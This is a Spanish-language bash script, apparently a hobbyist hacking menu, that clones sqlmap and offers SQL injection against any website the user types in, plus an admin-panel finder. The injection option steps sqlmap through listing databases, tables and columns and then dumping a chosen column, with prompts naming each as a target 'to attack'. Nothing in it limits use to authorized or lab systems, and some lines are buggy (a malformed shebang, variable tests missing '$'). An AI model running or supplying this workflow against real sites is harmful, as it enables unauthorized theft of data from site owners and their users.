#!bin/bash

blanco="\033[1;37m"
moradofuerte="\033[1;35m"
rojo="\033[1;31m"
amarillo="\033[1;33m"
morado="\033[0;35m"
cyanapagado="\033[0;36m"
azul="\033[1;34m"
negro="\033[30m"
verdeapagado="\033[32m"
verde="\033[1;32m"
cyan="\033[1;36m"

clear

echo -e $rojo"         "
echo "██╗███╗   ██╗███████╗████████╗ █████╗ ██╗      █████╗ ██████╗  ██████╗ ██████╗ 
██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗
██║██╔██╗ ██║███████╗   ██║   ███████║██║     ███████║██║  ██║██║   ██║██████╔╝
██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██╔══██║██║  ██║██║   ██║██╔══██╗
██║██║ ╚████║███████║   ██║   ██║  ██║███████╗██║  ██║██████╔╝╚██████╔╝██║  ██║
╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝"
echo -e $moradofuerte"                                               "
echo "=========================================================================="
echo
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
apt install python -y
sudo apt-get install python -y

clear

echo -e $cyan"                          "
echo "Elije una opcion

[1] Inyeccion SQL
[2] Buscador de panel admin"
echo -e $amarillo"                  "
read -p "=> " xdd

if [ $xdd = 1 ]; then
	cd sqlmap-dev
	clear
	echo -e $verde"                        "
	echo "███████╗ ██████╗ ██╗                                               
██╔════╝██╔═══██╗██║                                               
███████╗██║   ██║██║                                               
╚════██║██║▄▄ ██║██║                                               
███████║╚██████╔╝███████╗                                          
╚══════╝ ╚══▀▀═╝ ╚══════╝"
	echo -e $cyan"                                                "
	echo "██╗███╗   ██╗     ██╗███████╗ ██████╗ ██████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║     ██║██╔════╝██╔════╝██╔════╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║     ██║█████╗  ██║     ██║     ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║██   ██║██╔══╝  ██║     ██║     ██║██║   ██║██║╚██╗██║
██║██║ ╚████║╚█████╔╝███████╗╚██████╗╚██████╗██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝ ╚═════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝"
	echo -e $amarillo"                                         "
	read -p "Sitio web > " sitio
	echo -e $rojo"                                 "
	python sqlmap.py -u $sitio --dbs
	echo -e $amarillo"         "
	read -p "Base de datos a atacar > " database
	echo -e $rojo"        "
	python sqlmap.py -u $sitio -D $database --tables
	echo -e $amarillo"       "
	read -p "Tabla a atacar > " tabla
	echo -e $rojo"           "
	python sqlmap.py -u $sitio -D $database -T $tabla --columns
	echo -e $amarillo"                  "
	read -p "Columna a atacar > " columna
	echo -e $rojo"             "
	python sqlmap.py -u $sitio -D $database -T $tabla -C $columna --dump
	echo -e $verde"                         "
	read -p "Desea salir o continuar? > " preguntaxd
	if [ preguntaxd = c ]; then
		bash inyeccion-sql.sh
	fi

	if [ preguntaxd = s ]; then
		exit
	fi
fi

if [ $xdd = 2 ]; then
	python admin-buscador.py
fi
